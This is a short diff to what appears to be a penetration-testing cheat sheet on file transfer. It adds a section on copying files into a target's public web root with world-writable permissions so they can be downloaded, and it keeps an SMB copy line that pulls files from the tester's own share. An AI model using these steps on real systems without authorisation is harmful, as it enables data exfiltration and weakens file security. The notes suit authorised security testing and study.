@@ -18,6 +18,14 @@ copy \\myIP\share\file.ext .\file.ext
 ```
 Make sure to stop the SMBserver after transfer because everybody in that network has access to your SMBserver
 
+## HTML
+If your target has a public facing Webpage you can use it to download the files.
+```bash
+cp *.ext /var/www/html/
+chmod 0777 /var/www/html/*.ext
+http://target.URL/file.ext
+```
+
 ## Base64
 If all else fails, there is always plan y. <br>
 Convert a file or program to a Base64 string copy & paste it to the Target and deconvert it. <br>
